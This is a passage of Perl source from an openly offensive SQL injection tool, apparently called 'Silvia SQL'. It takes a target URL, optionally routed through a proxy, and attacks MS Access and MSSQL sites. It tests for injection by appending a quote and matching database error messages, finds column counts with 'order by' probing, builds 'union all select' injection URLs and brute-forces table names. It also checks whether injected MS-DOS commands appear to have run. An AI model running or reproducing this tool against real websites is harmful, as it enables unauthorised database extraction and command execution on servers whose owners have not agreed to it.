 if(($content=~/blocked access to STATEMENT/) || ($content=~/access denied/) || ($content=~/Login failed/) || ($content=~/Incorrect syntax/))
 {
 print "\nSorry failed to execute your ms dos command on target !!!\n";
$logs= "\nSorry failed to execute your ms dos command on target !!!\n";
 tulis();
 }
 else
 {
    print "\nServer doesnt respond with error message, maybe your ms dos command has been executed !!!\n";
$logs= "\nServer doesnt respond with error message, maybe your ms dos command has been executed !!!\n";
tulis();
 }
 
 
   
}
sub modul9()
{
ulangproxsi();
print "\n[+]Checking url(s) using order+by :";
$logs= "\n[+]Checking url(s) using order+by :";
tulis();
findcol();
 if($colength =~ /not found/)
 {
 }
 else
 {
 pus_tabel();
 }
}

sub pus_tabel()
{
print "\n----Trying to fuzz table name(s) in current database, please wait---\n";
$logs= "\n----Trying to fuzz table name(s) in current database, please wait---\n";
tulis();
    foreach $testabel(@fuzz_tables)
    {
	$kres='#';
    $old=$web_url;
	$int21h="+from+";
	$web_url=$homedarkc0dedarkc0decom.$int21h.$testabel.$kres;
    modus();
       if(($content =~ /cannot find the input table/) or ($content =~ /Syntax error/))
	    {
		print "-";
		}
		else
        {
        print "\n[+]Found a table called:".$testabel."\n"; 
        
		$logs= "\n[+]Found a table called:".$testabel."\n"; 
        tulis();
		   push(@vivi,$testabel);
   
		}
	
	 $web_url=$old;
    }

$size = @vivi;
 if($size<1)
     {
	  print "\nSorry !!! Table name can not be found !!!\n";
	  	  $logs= "\nSorry !!! Table name can not be found !!!\n";
  tulis();
	 }   
}
sub findcol()
{
$next="wisdom";
$awal=1;
$maks=50;
$seror="The Microsoft Jet database engine does not recognize";
$order="+order+by+";
$kres='#';
while (($awal<$maks) && ($next ne "no"))
  {
  $old=$web_url;
  $web_url=$web_url.$order.$awal.$kres;
  print "\nChecking url:$web_url";
  $logs= "\nChecking url:$web_url";
  tulis();
  modus();
  if($content =~ /Microsoft Jet database engine does not recognize/)
   {
   our $colength=$awal-1;
    $next="no";
   }
   else
   {
   print "\n-> no error found here !";
    $logs="\n-> no error found here !";
  tulis();
   $colength="Sorry column length not found !";
   }
  $web_url=$old;
  
  ++$awal;
  }
   $panjang=$colength+1;

 print "\n[++]W00t!!! Found Column Length: $colength";
 $logs= "\n[++]W00t!!! Found Column Length: $colength";
tulis();
  $mywisdom="+union+all+select+";
 $count=2;
 $code="1";
 while ($count < $panjang)
  {
  $code=$code.",".$count;
  ++$count;
  }
  
  
 our $sqli=$web_url.$mywisdom.$code.$kres;
 our $homedarkc0dedarkc0decom=$web_url.$mywisdom.$code;
 print "\n[+]SQLI url:".$sqli;
 $logs= "\n[+]SQLI url:".$sqli;
tulis();
 
}

sub modul10()
{
print "\n******************Silvia SQL Help Module****************\n";

print "Help module will be available soon !!!";



print "\n******************Silvia SQL Help Module****************\n";
}

sub modul11()
{

}
sub ulangproxsi()
{
 if (defined $web_url)
 {
 }
 else
 {
print "Do you want to use proxy url ? (y/n)";
$ans=<>;

$logs="Do you want to use proxy url ? (y/n)$ans";
tulis();

  if($ans=~"y")
   {
    $mywisdom="yes";
    print "\nExample of proxy url format: http://ip_address:port_number";
    print "\nType proxy url:";
    chomp( our $proxy_url = <STDIN> );
	rearrange_this_proxy();
      print "\n(must include http://";
	  print "\nType target url:";
    chomp( our $web_url = <STDIN> );
	rearrange_this_web();
   print "\n**********working please wait**************\n";
   print "[+]Your proxy:$proxy_url\n";
 $logs= "\nExample of proxy url format: http://ip_address:port_number";
    $logs.= "\nType proxy url:";
    $logs.=$proxy_url;

      $logs.= "\nType target url:";
    $logs.=$web_url;
   $logs.= "\n**********working please wait**************\n";
   $logs.= "[+]Your proxy:$proxy_url\n";
tulis();
   
   }
   else
   {
    $mywisdom="no";
	      print "\nmust include http://";

    print "\nType target url:";
    chomp( our $web_url = <STDIN> );
    print "\n**********working please wait**************\n";
   $logs= "\nType target url:";
    $logs.=$web_url;
    $logs.="\n**********working please wait**************\n";
    tulis(); 

   }
 }
}

sub askproxsi()
{
print "Do you want to use proxy url ? (y/n)";
$ans=<>;
$logs="Do you want to use proxy url ? (y/n)$ans";
  if($ans=~"y")
   {
    $mywisdom="yes";
    print "\nExample of proxy url format: http://ip_address:port_number";
    print "\nType proxy url:";
    chomp( our $proxy_url = <STDIN> );
		rearrange_this_proxy();
      print "\nmust include http://";

      print "\nType target url:";
    chomp( our $web_url = <STDIN> );
		rearrange_this_web();

   print "\n**********working please wait**************\n";
   print "[+]Your proxy:$proxy_url\n";
   
$logs= "\nExample of proxy url format: http://ip_address:port_number";
    $logs.= "\nType proxy url:";
    $logs.=$proxy_url;

      $logs.= "\nType target url:";
    $logs.=$web_url;
   $logs.= "\n**********working please wait**************\n";
   $logs.= "[+]Your proxy:$proxy_url\n";
   tulis();
   cekvulnerprox();
   }
   else
   {
    $mywisdom="no";
    print "\nType target url:";
    chomp( our $web_url = <STDIN> );
 print "\n**********working please wait**************\n";
 $logs="\nType target url:$web_url";

$logs.="\n**********working please wait**************\n";
tulis();
      ceknoprox();
    }
}
sub modus()
 {
 if(our $mywisdom=~"yes")
  {
  roksi();
  }
  else
  {
  tanpa_proksi();
  }

 }

sub cekvulnerprox()
{
 #cek kuote
$url_old=$web_url;
$web_url =~ s/\"//g;
$web_url =~s/$/\'/; 
print "[+] Checking url : $web_url\n";
$logs="[+] Checking url : $web_url\n";
tulis();
roksi();
has_error();
$web_url=$url_old;
}

sub ceknoprox()
{
 #cek kuote
$url_old=$web_url;
$web_url =~ s/\"//g;
$web_url =~s/$/\'/; 
print "[+] Checking url : $web_url\n";
$logs="[+] Checking url : $web_url\n";
tulis();

   tanpa_proksi();

has_error();
$web_url=$url_old;

}

sub has_error()
 {
if($content =~m/Microsoft JET Database/ || $content =~m/ODBC Microsoft Access Driver/)
    {
     print "[++]Target Could be Vulnerable in MS Access Injection!! w00t !!!\n";
     $logs="[++]Target Could be Vulnerable in MS Access Injection!! w00t !!!\n";
     tulis();
    }
elsif($content =~m/Microsoft OLE DB Provider for SQL Server/ || $content =~m/Unclosed quotation mark/)
    {
     print "[++]Target Could be Vulnerable in MSSQL Injection!! w00t !!!\n";
     $logs="[++]Target Could be Vulnerable in MSSQL Injection!! w00t !!!\n";
     tulis();
    }
else
    {
    print "[-]Sorry no error message found !! target maybe not vulnerable for mssql injection or ms jet injection or it has other type of bug(s) !! \n";
    $logs="[-]Sorry no error message found !! target maybe not vulnerable for mssql injection or ms jet injection or it has other type of bug(s) !! \n";
   tulis();
    }  

 }
sub roksi()
{
our $ua = LWP::UserAgent->new;
$ua->proxy('http', $proxy_url); ## proxy_url contains somthing like http://10.10.10.10:1234/
$ua->timeout(10);
## now reading the webpage
our $request = HTTP::Request->new(GET => $web_url);
our $response = $ua->request($request);
our $content = $response->content();
}
sub tanpa_proksi()
 {
our $ua = LWP::UserAgent->new;
our $request = HTTP::Request->new(GET => $web_url);
our $response = $ua->request($request);
our $content = $response->content();
 }
sub kubus_clear()
{
our $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); } 
}
sub utama()
{
   kubus_clear();
   halo();   
   operasi();
}
utama();